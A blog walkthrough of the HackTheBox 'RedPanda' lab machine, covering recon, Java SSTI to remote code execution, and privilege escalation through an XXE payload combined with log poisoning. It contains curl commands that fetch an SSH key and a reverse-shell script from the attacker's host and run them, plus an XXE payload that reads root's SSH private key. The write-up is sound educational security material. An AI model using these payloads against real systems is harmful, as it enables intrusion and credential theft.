---
layout: post
title: HackTheBox - RedPanda
category: HackTheBox
tags: machines linux java code-analysis ssti xxe web
date: 2022-11-26 22:03 +0300
---

![Machine logo](/assets/hackthebox/redpanda/RedPanda.png){:height="400px" width="600px"}

# Configuration

If you're using your own machine like me, you have to access HTB network via `OpenVPN`:

```zsh
sudo openvpn lab_access_file.ovpn
```

It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.

```zsh
echo '10.10.11.170  redpanda redpanda.htb' | sudo tee -a /etc/hosts
```

# Reconnaissance

## All ports scan

```zsh
sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.11.170 --rate=500
```

```
Discovered open port 22/tcp on 10.10.11.170                                    
Discovered open port 8080/tcp on 10.10.11.170
```

## nmap ports scan

```zsh
sudo nmap -A -p 22,8080 redpanda
```

```
# The output is formatted by me
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a `ssh` and `http` services here, HackTheBox is not about brute-forcing access, so let's explore the web application.

## Web application

![Web app](/assets/hackthebox/redpanda/web_app.png)

At the start we check for technologies used in application. We can do it with `whatweb` or `Wappalyzer`.

```zsh
whatweb redpanda.htb:8080
```

```
http://redpanda.htb:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
```

As we can see, there is nothing interesting for us.

We have a search console at the root page.


We can input empty string, and the search console will return Greg red panda with a link to an author statistics.

![Greg red panda](/assets/hackthebox/redpanda/greg_red_panda.png)

# user.txt

## Enumeration

Looks like the search console is filtering the input, but let's intercept the request with `BurpSuite`. We start a proxy and sending request to the Repeater.

![Trying to inject code](/assets/hackthebox/redpanda/Burp1.png)

We can see that `&&` symbols are working like something special, but we can't see the result. Let's check by `pinging` our machine. To do this we have to listen our machine traffic and filter it by `ICMP`. Our request is looking like this:

```
name=test&&ping -c 4 <YOUR_IP>
```

![Search code injection haven't worked](/assets/hackthebox/redpanda/wireshark_approve.png)

Unluckly, it haven't worked for us.

Looks like there is nothing more interesting for us, so let's enumerate search console harder. We are trying to perform `Template injection` attack here by inputting `${7*7}`, but the application bans it. Next, we try to input `#{7*7}` and there it is! Also, we have to url encode our request.

![Template injection](/assets/hackthebox/redpanda/template_injection.png)

There is a `Server Side Template Injection` (STTI) vulnerability. But if we try something more with `#` symbol, we'll get nothing. We have to test other symbols with url encode. We try `*{7*7}` here.

![Star is that symbol](/assets/hackthebox/redpanda/star.png)

## Exploitation

Nice, now we have to identify template engine. Here we just have to try language specific injections. After some testing we find that the engine is Java. In [this github repository](https://github.com/VikasVarshney/ssti-payload) we can find a tool to generate java payload and get `Remote Code Exectuion`. That tool also supports url encode. At first we try to read `/etc/passwd`.

![Attempt to get users](/assets/hackthebox/redpanda/etc_passwd.png)

We got it! We noted that there is a ssh service on the machine. Let's try to add our ssh key woodenk `authorized_keys`. We generate a key with `ssh-keygen`. Now let's upload our public RSA key. The server is filtering `>` symbol, so we cant just forward our input to a file. So, to do this we have to set up a webserver, then execute `curl` on machine with `-o` flag and change file permissions. We have to execute these commands on remote machine:

```zsh
curl http://<YOUR_IP>:<YOUR_PORT>/id_rsa.pub -o /home/woodenk/.ssh/authorized_keys
chmod 600 /home/woodenk/.ssh/authorized_keys
```

If everything is good we are allowed to access the ssh with woodenk user.

```zsh
ssh -i id_rsa woodenk@redpanda
cat user.txt
```

```
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # EDITED
```

# root.txt

## Exploring

I think HackTheBox developers have made this box not to ssh into it, because the user running the application has more privileges than ssh user, we can check it by `id` command. We will learn why it works like that later:

```bash
id
```

```
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

So, with this we have to upload reverse shell on the machine. We prepare our reverse shell file with [revshells.com](https://www.revshells.com/), I've choosed simple `Bash` here. Then, we set up a simple web server, listener and execute these commands on the machine by converting them with ssti-payload:

```bash
curl http://<YOUR_IP>:<YOUR_PORT>/reverse_shell.sh -o /tmp/reverse_shell.sh
bash /tmp/revese_shell.sh
```

Now we have more privileges, let's explore! 

If we check `processes`, we can see why we've got more privileges than ssh user.

```bash
ps aux
```

```
... output ...
root         874  0.0  0.1   6812  3060 ?        Ss   Jul15   0:00 /usr/sbin/cron -f
root         875  0.0  0.1   8356  3384 ?        S    Jul15   0:00 /usr/sbin/CRON -f
root         879  0.0  0.0   2608   596 ?        Ss   Jul15   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         880  0.0  0.2   9424  4640 ?        S    Jul15   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         881  0.0  0.3  12172  7328 ?        Ss   Jul15   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
woodenk      888  0.7 12.4 3124848 251856 ?      Sl   Jul15   2:40 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
...output ...
```

Web application is runned by root with setting up `woodenk` user and `logs` group. We note that `cron` and `ssh` are running on the machine. Let's check if root login is allowed:

![PermitRootLogin](/assets/hackthebox/redpanda/permit_root_login.png)

Also, if we list `/opt/` directory, we can find a script called `cleanup.sh`.

![opt Directory](/assets/hackthebox/redpanda/opt_dir.png)

![cleanup.sh Script](/assets/hackthebox/redpanda/cleanup_script.png)

This script is removing files with `jpg` and `xml` extensions from all directories we can write. Let's note it. Next, we know that the application is written in Java. We can try to search the source code of this application, we'll find the file called `MainController.java`, let's read it.

We can find mysql credentials in searchPanda function.

![woodenk Credentials](/assets/hackthebox/redpanda/searchpanda_java.png)

They are also valid for ssh.

![Valid credentials](/assets/hackthebox/redpanda/valid_credentials.png)

We noted that files with jpg and xml extensions are sometimes cleared, we can see how application works with them:

![Export XML](/assets/hackthebox/redpanda/export_xml.png)

Files exporting need to either come from woodenk or damian. We can try to exploit `XML External Entity` (XXE) attack. You can learn about it at [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity).

In /opt/ directory we have an another application called `LogParser`, let's check it's source code. We will find how the app handles the metadata of images:

![Metadata handler](/assets/hackthebox/redpanda/metadata_handler.png)

Next, we can see how the app parses logs:

![Log parser](/assets/hackthebox/redpanda/user_agent_handler.png)

We note that `line` is a string passed to a function. We can poison it by adding an extra `||` to our user agent and then providing a URI.

So, now we have all the information to perform our plan:

1. We create a jpg with `Artist` tag setted up in metadata and putting it in home directory
2. We create a XXE exploit with `_creds.xml` at the end of name and putting it in home directory. We set author tag to `damian`
3. We navigate to any part of the website with modified `User-Agent` to trigger the application
4. We read our `*_creds.xml` file

We noted that ssh is running, so we are trying to read `/root/.ssh/id_rsa` file.

## Privilege escalation

Let’s start performing our plan to get root, we’ll get a random jpg and add the necessary details to it.

```zsh
exiftool -Artist='../home/woodenk/vflamie' root.jpg
```

Our XXE exploit will look like that:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/root.jpg</uri>
    <hello>&ent;</hello>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

We save this file as vflamie_creds.xml.

Then, we intercept our request to the page with BurpSuite and modifying User-Agent with this string:

```
||/../../../../../../../home/woodenk/root.jpg
```

Finally, we re-read our xml file:

![Success](/assets/hackthebox/redpanda/root_ssh_key.png)

It worked! Now we're copying the key to file, and logging in!

```zsh
chmod 600 id_rsa
ssh -i id_rsa root@redpanda
cat root.txt
```

```
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # EDITED
```

# Conclusion

I don't think it is an easy box, it was really hard to understand what to do here. But it is really cool feeling when your attempts finally starting work. I've learned a lot and enjoyed the box!

Thank you for reading, I hope it was useful for you ❤️
